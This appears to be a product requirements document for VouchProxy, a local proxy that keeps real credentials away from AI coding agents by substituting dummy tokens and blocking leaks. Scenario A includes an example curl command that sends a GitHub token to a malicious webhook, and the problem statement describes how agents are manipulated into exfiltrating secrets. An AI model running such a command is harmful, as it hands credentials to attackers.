# Product Requirements Document (PRD): VouchProxy

**Document Version:** 1.0.0  
**Status:** Approved for Implementation  
**Target Delivery:** v1.0.0 (Production Core Loop)  
**Author:** Staff Systems Architect & Security Engineering Lead  
**Classification:** Confidential / Zero-Trust Systems Architecture  

---

## 1. Executive Summary & Value Proposition

### 1.1 One-Line Value Proposition
**VouchProxy** is a zero-trust, host-scoped credential injection and PII-scrubbing local MITM proxy engineered specifically for autonomous AI coding agents (`gemini-cli`, `claude-code`, `aider`, `cursor`) and Model Context Protocol (MCP) servers.

### 1.2 Core Problem Statement
Modern autonomous AI coding agents and MCP tool execution environments introduce unprecedented credential exfiltration and privacy violation risks:
1. **Plaintext Credential Sprawl:** Developers store real API keys (`OPENAI_API_KEY`, `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY`) in `.env` files within project directories. Coding agents accidentally read these files, inject them into prompt context, write them into public git commits, or output them in diagnostic logs.
2. **Subprocess PII Leaks:** Coding agents execute arbitrary terminal commands (`curl`, `python3`, `git`, `npm`) whose outbound network requests routinely leak the developer's identity, email address, system username, and workstation hostname across `User-Agent`, `From`, and authorization headers.
3. **MCP Confused-Deputy & Issuer-Confusion Attacks:** MCP servers connecting to third-party OAuth providers can be manipulated into sending bearer tokens to adversary-controlled endpoints via malicious prompt injections or manipulated tool calls.
4. **Agent Hallucination & Exfiltration:** Compromised or hallucinating agents can attempt to exfiltrate cached environment variables by sending POST requests to unauthorized webhooks.

### 1.3 The VouchProxy Solution
VouchProxy completely severs the link between the running agent subprocess and the developer's real credentials:
- **Dummy Token Substitution:** The child agent process environment receives strictly non-functional dummy tokens (e.g., `VP_GITHUB_TOKEN_DUMMY_8f9a2b`).
- **Transparent Local Loopback Proxy:** VouchProxy spawns an ephemeral HTTP/HTTPS CONNECT proxy on `127.0.0.1`, injecting proxy environment variables and local CA bundles into the child process.
- **Fail-Closed Host-Scoped Injection:** The proxy intercepts outbound traffic. It inspects the destination domain against a strict declarative policy (`vouch.yaml`). If and only if the destination host and target header match an authorized rule, VouchProxy swaps the dummy token with the real credential retrieved from an encrypted local vault (`vault.enc`).
- **Exfiltration Abort:** If an agent attempts to send a dummy token to an unauthorized domain or unapproved endpoint, VouchProxy immediately drops the request with `HTTP 403 Forbidden` and records a security incident.
- **Bi-Directional PII Scrubbing:** All outbound headers, URL queries, and request bodies are sanitized to strip developer emails, hostnames, and local usernames before egressing to the public internet.
- **Zero Cloud Footprint:** 100% local execution, zero analytics, zero external network dependencies.

---

## 2. Personas & Operating Scenarios

### 2.1 Personas
- **Autonomous Agent Engineers:** Engineers running local agentic loops (`claude-code`, `aider`, `devin`-style daemons) who require high agent autonomy without risking API token compromise or credential commit leaks.
- **Enterprise Security Teams:** Compliance and security auditors requiring auditable, tamper-resistant local ledgers of every external API call, payload destination, and credential injection performed by autonomous tools.
- **MCP Tool Authors:** Developers creating and running Model Context Protocol servers that bridge AI models to internal databases, cloud platforms, and SaaS APIs.

### 2.2 End-to-End Operating Scenarios

#### Scenario A: Sandboxed Agent Execution (`vouchproxy run`)
1. Developer runs `vouchproxy run -- aider --model sonnet`.
2. VouchProxy spins up on `127.0.0.1:<random-port>` with an ephemeral session authentication secret.
3. VouchProxy generates and injects child process environment:
   - `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `http_proxy`, `https_proxy`, `all_proxy` pointing to the ephemeral proxy.
   - `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE` pointing to VouchProxy's root CA certificate.
   - `ANTHROPIC_API_KEY=VP_ANTHROPIC_KEY_DUMMY_9a7c1b`
   - `GITHUB_TOKEN=VP_GITHUB_TOKEN_DUMMY_3e5f8a`
4. The agent executes `curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user`.
5. VouchProxy intercepts the HTTPS CONNECT to `api.github.com:443`, mints an on-the-fly TLS certificate signed by its root CA, inspects the HTTP headers, validates the `Proxy-Authorization` session token, detects the dummy token, looks up the policy for `api.github.com`, replaces the dummy token with the real GitHub PAT from memory, and relays the request.
6. The agent executes `curl -H "Authorization: Bearer $GITHUB_TOKEN" https://malicious-webhook.site/log`.
7. VouchProxy intercepts the request, detects `VP_GITHUB_TOKEN_DUMMY_*` destined for an unapproved domain, terminates the connection with `HTTP 403 Forbidden`, and logs an alert.

#### Scenario B: Secret Lifecycle & Key Custody (`vouchproxy secret`)
1. Developer executes `vouchproxy secret set OPENAI_API_KEY`.
2. VouchProxy prompts for the secret value using a terminal password mask (`termios` / Windows console API, preventing echo).
3. Secret is encrypted via Argon2id key derivation and AES-256-GCM authenticated encryption and stored in `~/.vouchproxy/vault.enc` with file permission `0600`.
4. The developer never checks `.env` files into Git.

---

## 3. Scope & Feature Boundaries

### 3.1 In Scope (v1.0 Production Core Loop)
- Single static Go 1.23+ binary for macOS (`arm64`, `amd64`), Linux (`amd64`, `arm64`), and Windows (`amd64`).
- Encrypted local credential vault (`vault.enc`) utilizing Argon2id + AES-256-GCM.
- Dynamic MITM TLS engine with self-signed Root CA generation and in-memory LRU certificate caching.
- Declarative policy engine (`vouch.yaml`) supporting host matching (exact and wildcard), header mapping, and dummy token substitution.
- Outbound PII scrubber for user emails, hostnames, and system usernames across headers and text payloads.
- Localhost-only proxy (`127.0.0.1`) with dynamic ephemeral port binding and per-session proxy token authentication.
- Cross-platform process supervisor supporting clean process group termination on POSIX (`SIGINT`/`SIGTERM`) and Windows Job Objects.
- Local SQLite WAL audit ledger logging timestamp, destination host, path, status, matched rule, and scrub actions (zero raw secrets logged).
- CLI commands: `init`, `secret set`, `secret list`, `secret delete`, `run`, `audit`, and `status`.

### 3.2 Out of Scope (Deferred to Future Milestones)
- v2.0: Deep parsing of MCP JSON-RPC over `stdio` and Streamable-HTTP with RFC 8707 resource indicators.
- v3.0: Interactive Bubble Tea TUI prompt for dynamic human-in-the-loop domain approval.
- v4.0: Hardware security modules and OS-native keychains (macOS Keychain, Windows Credential Manager, Linux Secret Service).
- Transparent network-level packet redirection via eBPF or `pf` firewall (v1.0 relies strictly on standard proxy environment variables).

---

## 4. Fail-Closed Security Invariants

The implementation must enforce the following non-negotiable security invariants:

| ID | Invariant Name | Rule / Specification | Failure Behavior |
|:---|:---|:---|:---|
| **INV-01** | **Localhost Only** | Proxy listener must bind exclusively to IPv4 loopback `127.0.0.1` (never `0.0.0.0` or public interface). | Process aborts on startup if bound address is non-loopback. |
| **INV-02** | **Session Authentication** | Every `vouchproxy run` invocation generates a 32-byte cryptographically secure random session token. Outbound proxy requests must supply `Proxy-Authorization: Bearer <session-token>`. | HTTP `407 Proxy Authentication Required` returned to any unauthenticated caller. |
| **INV-03** | **Dummy Token Leak Interception** | If any request payload, header, or URL parameter contains a registered dummy token pattern (`VP_<KEY>_DUMMY_*`) and the destination host is **not** explicitly authorized in `vouch.yaml`, the request is dropped. | HTTP `403 Forbidden` returned immediately. Event logged as `DUMMY_LEAK_ATTEMPT` with host, path, and timestamp. |
| **INV-04** | **Zero Raw Secret Logging** | Raw credentials retrieved from `vault.enc` must never be written to SQLite audit logs, error messages, terminal standard output, or panic traces. | Enforced by type-safe `SecretBytes` wrapper with custom `String()` / `GoString()` returning `[REDACTED]`. |
| **INV-05** | **Explicit Memory Zeroization** | All decrypted secret buffers, vault passphrases, and derived encryption keys must reside in byte slices (`[]byte`) and be actively overwritten with zeros (`runtime.KeepAlive()` barrier) immediately after use. | Eliminates lingering secrets in Go heap garbage collector cycles. |
| **INV-06** | **DNS Rebinding & Host Validation** | For HTTPS CONNECT requests, the proxy validates that the TLS Server Name Indication (SNI) matches the HTTP `Host` header and the CONNECT authority destination. | Connection aborted with TLS alert if SNI and Host header disagree. |
| **INV-07** | **Filesystem Permission Lockdown** | Configuration directories (`~/.vouchproxy`), `vault.enc`, and `ca.key` must enforce strict `0600` permissions (POSIX) or explicit user-only access control lists (Windows DACL). | Refuse startup if permissions are world-readable or group-readable. |
| **INV-08** | **Zombie Process Prevention** | When VouchProxy receives `SIGINT`, `SIGTERM`, or exits unexpectedly, the entire child process tree must be terminated synchronously. | POSIX: Process group `kill(-pgid, SIGTERM)`. Windows: Win32 Job Object with `KILL_ON_JOB_CLOSE`. |
| **INV-09** | **Strict Policy Fallback** | Unmatched outbound domains pass through without credential injection, subject to PII scrubbing and dummy token leak detection. If configured in `strict: true` mode, all unmapped external outbound traffic is blocked with HTTP `502 Bad Gateway`. | Default: Safe pass-through with scrub. Strict: Block unmapped hosts. |
| **INV-10** | **Immutable Audit Ledger** | SQLite database must operate in Write-Ahead Logging (WAL) mode (`PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL; PRAGMA wal_autocheckpoint=1000;`) to prevent lock contention and corrupted writes during sudden termination. | Auto-recovery on startup via SQLite WAL checkpointing. |

---

## 5. Cross-Platform Parity Matrix

| Capability | macOS (Darwin ARM64 / AMD64) | Linux (kernel 4.19+ AMD64 / ARM64) | Windows (Windows 10/11, Server 2022 AMD64) |
|:---|:---|:---|:---|
| **Binary Output** | Single static Mach-O (`vouchproxy`) | Single static ELF (`vouchproxy`), zero CGO | Single PE binary (`vouchproxy.exe`), zero CGO |
| **Proxy Env Vars** | `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `http_proxy`, `https_proxy`, `all_proxy`, `NO_PROXY=""` | Same as macOS | Same as macOS (plus case-insensitive registry/process table parity) |
| **CA Trust Env Vars** | `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, `CARGO_HTTP_CAINFO`, `AWS_CA_BUNDLE` | Same as macOS | Same as macOS (Windows backslash normalized path support) |
| **Process Grouping** | `syscall.Setpgid(0, 0)` on child; `syscall.Kill(-pgid, SIGKILL)` on exit | Same as macOS | Win32 `CreateJobObjectW` + `SetInformationJobObject` (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) |
| **Terminal Masking** | POSIX `termios` (`tcsetattr` echo off) via `golang.org/x/term` | Same as macOS | Windows Console API (`GetConsoleMode`, `SetConsoleMode`) via `golang.org/x/term` |
| **File Permissions** | `os.OpenFile(..., 0600)` | `os.OpenFile(..., 0600)` | Explicit DACL assignment via Win32 security descriptor APIs (restricting read/write to current user SID) |
| **Default Paths** | `~/.vouchproxy/` (`$HOME/.vouchproxy`) | `~/.vouchproxy/` (`$XDG_CONFIG_HOME/vouchproxy` fallback) | `%USERPROFILE%\.vouchproxy\` (`%APPDATA%\vouchproxy` fallback) |

---

## 6. CLI Command Specifications

### 6.1 `vouchproxy init`
Initializes a new VouchProxy configuration directory.
```bash
vouchproxy init [--dir <path>] [--force]
```
- **Action:**
  1. Creates config directory (`~/.vouchproxy` by default).
  2. Generates self-signed Root CA (`ca.key` and `ca.crt`, ECDSA P-256, 10-year expiration).
  3. Prompts user for a master vault passphrase (minimum 10 characters).
  4. Derives master key via Argon2id and initializes an empty encrypted `vault.enc`.
  5. Scaffolds default `vouch.yaml` policy template with standard AI provider definitions (Anthropic, OpenAI, GitHub, HuggingFace).
  6. Enforces `0700` on directories and `0600` on private keys and vault files.

### 6.2 `vouchproxy secret`
Manages encrypted credentials inside `vault.enc`.
```bash
# Set or update a secret
vouchproxy secret set <KEY_NAME> [--env <ENV_VAR>]

# List all stored keys (names, creation date, bound dummy token name - NEVER values)
vouchproxy secret list

# Delete a stored secret
vouchproxy secret delete <KEY_NAME>
```
- **Validation:**
  - `<KEY_NAME>` must match `^[A-Z0-9_]{2,64}$`.
  - Prompts for master passphrase if not set in `VOUCH_MASTER_KEY` environment variable.
  - Secret value is collected via terminal password mask and immediately zeroed after encryption.

### 6.3 `vouchproxy run`
Executes an arbitrary command inside the VouchProxy secured sandbox.
```bash
vouchproxy run [--config <path>] [--audit-db <path>] [--strict] -- <command> [args...]
```
- **Flags:**
  - `--config <path>`: Path to policy configuration (default: `~/.vouchproxy/vouch.yaml`).
  - `--audit-db <path>`: Path to SQLite audit database (default: `~/.vouchproxy/audit.db`).
  - `--strict`: Enable fail-closed mode for all unmapped outbound domains (default: false).
  - `--verbose`: Enable detailed operational proxy logging to stderr.
- **Child Execution Protocol:**
  1. Unlocks `vault.enc` into secure memory for the duration of the run.
  2. Starts local proxy listener on `127.0.0.1:0` (ephemeral port).
  3. Generates 32-byte session secret.
  4. Scaffolds child environment with proxy settings, CA bundles, and dummy tokens (`VP_<KEY>_DUMMY_<HASH>`).
  5. Launches child process in dedicated process group / job object.
  6. Forwards `stdin`, `stdout`, `stderr`.
  7. On child termination or SIGINT, gracefully stops proxy, checkpoints SQLite WAL, zeroes vault memory, and exits with child's exit code.

### 6.4 `vouchproxy audit`
Inspects the immutable local SQLite audit ledger.
```bash
vouchproxy audit [--tail] [--limit <n>] [--host <domain>] [--action <allow|inject|block|scrub>] [--json]
```
- **Output:** Formatted tabular or JSON log display showing:
  - Timestamp (UTC ISO 8601)
  - HTTP Method & Host
  - Path (query params sanitized)
  - Action Taken (`INJECT_SECRET`, `SCRUB_PII`, `BLOCK_LEAK`, `PASSTHROUGH`)
  - Target Injected Key Name (e.g., `GITHUB_TOKEN`, never the secret value)
  - Response Status Code

### 6.5 `vouchproxy status`
Displays health check information:
- CA expiration date and fingerprint.
- Vault status (file size, total stored secrets count, last modified).
- Active policy rule count and syntax validation.
- Audit database size and total logged transactions.

---

## 7. Policy Configuration Specification (`vouch.yaml`)

```yaml
version: "1.0"

# Global security settings
settings:
  strict_mode: false            # If true, block all unmapped domains with HTTP 502
  proxy_auth_required: true     # Enforce per-session Proxy-Authorization header
  mitm_cache_size: 500          # Maximum dynamic leaf certificates cached in memory
  connect_timeout_seconds: 15
  request_timeout_seconds: 60

# PII Scrubbing Rules applied to outbound headers and request bodies
scrubbing:
  emails: true                  # Scans and scrubs RFC 5322 email patterns
  usernames:                    # Specific usernames/hostnames to redact
    - "$USER"
    - "$HOSTNAME"
  custom_regex:
    - name: "Internal-IP"
      pattern: '\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}\b'
      replacement: "[INTERNAL_IP_REDACTED]"

# Host-Scoped Credential Injection Rules
rules:
  - name: "Anthropic API"
    host: "api.anthropic.com"
    match_type: "exact"         # exact | wildcard | cidr
    headers:
      - name: "x-api-key"
        secret: "ANTHROPIC_API_KEY"
        dummy_match: "VP_ANTHROPIC_API_KEY_DUMMY_*"
    allowed_methods: ["POST", "GET"]

  - name: "OpenAI API"
    host: "api.openai.com"
    match_type: "exact"
    headers:
      - name: "Authorization"
        format: "Bearer {{secret}}"
        secret: "OPENAI_API_KEY"
        dummy_match: "VP_OPENAI_API_KEY_DUMMY_*"

  - name: "GitHub API"
    host: "api.github.com"
    match_type: "exact"
    headers:
      - name: "Authorization"
        format: "Bearer {{secret}}"
        secret: "GITHUB_TOKEN"
        dummy_match: "VP_GITHUB_TOKEN_DUMMY_*"

  - name: "Internal Enterprise GitHub"
    host: "*.internal.corp"
    match_type: "wildcard"
    headers:
      - name: "Authorization"
        format: "token {{secret}}"
        secret: "CORP_GH_TOKEN"
        dummy_match: "VP_CORP_GH_TOKEN_DUMMY_*"
```

---

## 8. Non-Functional Requirements (NFRs)

1. **Latency Overhead:** Interception, policy evaluation, PII scrubbing, and secret injection must complete with $< 2.0\text{ ms}$ overhead ($p99$) for standard payloads under $1\text{ MB}$.
2. **Resource Efficiency:** Maximum idle memory footprint $< 25\text{ MB}$ RSS. Peak throughput $> 5,000\text{ req/sec}$ on standard multi-core hardware.
3. **Zero External Runtime Dependencies:** Pure Go implementation compiled with `CGO_ENABLED=0`. No external dynamic libraries, OpenSSL dependencies, or system SQLite runtime requirements.
4. **Clean Code & Test Coverage:** Minimum 85% branch test coverage across cryptographic routines, policy evaluation, and MITM proxy connection lifecycle.
